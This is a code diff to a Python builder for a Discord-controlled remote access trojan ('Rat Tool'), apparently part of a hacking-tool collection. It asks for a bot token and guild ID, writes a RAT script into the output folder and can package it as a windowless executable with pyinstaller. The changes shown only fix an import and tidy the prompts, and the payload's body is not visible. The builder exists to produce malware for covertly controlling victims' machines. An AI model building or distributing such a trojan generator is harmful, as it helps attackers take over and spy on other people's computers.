@@ -1,31 +1,30 @@
 from colorama import Fore
-from util.plugin.common import *
 import time, sys, os
-
+from util.plugins.common import * 
 
 def discordrat():
     setTitle("Rat Tool")
     def spinner():
         l = ['|', '/', '-', '\\']
         for i in l+l:
-            sys.stdout.write(f"""\r Creating File... {i}""")
+            sys.stdout.write(f"""\rCreating File... {i}""")
             sys.stdout.flush()
             time.sleep(0.2)
         print('\n')
         for i in l+l+l+l:
-            sys.stdout.write(f"""\r Writing File... {i}""")
+            sys.stdout.write(f"""\rWriting File... {i}""")
             sys.stdout.flush()
             time.sleep(0.2)
 
     clear()
-    print(f""" Enter the name you want to give to the final file: """)
+    print(f"""Enter the name you want to give to the final file: """)
     global filename
-    fileName = str(input(f""" File name: """))
-    print(f"""\n Enter the token of the bot you will use to execute the RAT commands: """)
+    fileName = str(input(f"""File name: """))
+    print(f"""\nEnter the token of the bot you will use to execute the RAT commands: """)
     global tokenbot
-    tokenbot = str(input(f""" Bot token: """))
-    print(f"""\n Enter the guild ID on which the slash commands are registered: """)
-    guildid = str(input(f""" Guild ID: """))
+    tokenbot = str(input(f"""Bot token: """))
+    print(f"""\nEnter the guild ID on which the slash commands are registered: """)
+    guildid = str(input(f"""Guild ID: """))
     print('\n')
     spinner()
 
@@ -622,23 +621,23 @@ client.run(token)""".replace("~~TOKENHERE~~'", tokenbot + "'; g = [" + guildid +
 
 
     except Exception as e:
-        print(f"""\n\n\n\n  Error writing file: {e}""")
+        print(f"""\n\n\n\nError writing file: {e}""")
         os.system(2)
         clear()
         main()
 
-    print(f"""\n\n\n File has been correctly written to "output/{fileName}.py" """)
-    convert = input(f""" Convert your script into an executable (Y/N) ? """)
+    print(f"""\n\n\nFile has been correctly written to "output/{fileName}.py" """)
+    convert = input(f"""Convert your script into an executable (Y/N) ? """)
     if convert.upper() == 'Y' or convert.upper() == 'YES':
         try:
             time.sleep(1)
             clear()
 
-            print(f' File creation...')
+            print(f'File creation...')
             time.sleep(1)
             os.system(f"pyinstaller -y -F -w output/{fileName}.py")
             clear()
-            print(f' Cleaning up old files...')
+            print(f'Cleaning up old files...')
             time.sleep(1)
             try:
                 import shutil
@@ -650,12 +649,14 @@ client.run(token)""".replace("~~TOKENHERE~~'", tokenbot + "'; g = [" + guildid +
             except:
                 pass
             clear()
-            print(f" The executable file has been correctly generated")
+            print(f"The executable file has been correctly generated")
         except:
             clear()
-            print(f" The executable file has been correctly generated")
+            print(f"The executable file has been correctly generated")
     
-        input(f" Press ENTER to exit")
+        input(f"Press ENTER to exit")
     else:
-        input(f" Press ENTER to exit")
+        input(f"Press ENTER to exit")
     main()
+
+discordrat()
